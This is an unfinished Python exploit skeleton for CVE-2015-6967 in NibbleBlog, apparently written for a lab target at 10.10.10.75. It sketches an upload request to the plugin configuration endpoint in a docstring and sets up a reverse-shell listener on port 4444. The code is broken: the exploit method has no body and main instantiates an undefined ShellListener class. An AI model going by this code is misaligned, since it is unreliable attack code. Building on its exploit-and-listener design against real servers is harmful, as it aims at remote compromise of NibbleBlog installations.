#!/usr/bin/python
import requests
import argparse

class NibbleExploit:

    __cve = "CVE-2015-6967"
    __description = ""

    def __init__(self):
        """ Load Exploit """
        print("Initialising exploit for {0}".format(self.__cve))

    def exploit(self, target, base_url):
        """
        payload = {  }
        r = requests.post('http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image')
        post
        """


class Listener:

    __ip_address = "0.0.0.0"
    __port_number = 0

    def __init__(self):
        """ Load Listener """
        print("Initialising Listener")
    
    def start(self, local_ip, local_port):
        """ Set Listener to Run """
        print("Running listener on {0}:{1}".format(local_ip,local_port))

    def ip(self):
        return self.__ip_address

def main():

    """ Parse Arguments """
    parser = argparse.ArgumentParser()
    parser.add_argument("target",help="Target IP address or domain name",type=str)
    parser.add_argument("base_url",help="NibbleBlog base URL e.g. /nibbleblog",type=str)
    args = parser.parse_args()
    
    

    """ Init Exploit """
    cve = NibbleExploit()
    listener = ShellListener()

    listener.start("127.0.0.1",4444)


    try:
        cve.exploit(args.target,args.base_url)
    except:
        print("Generic error")
        
if __name__ == "__main__":
    main()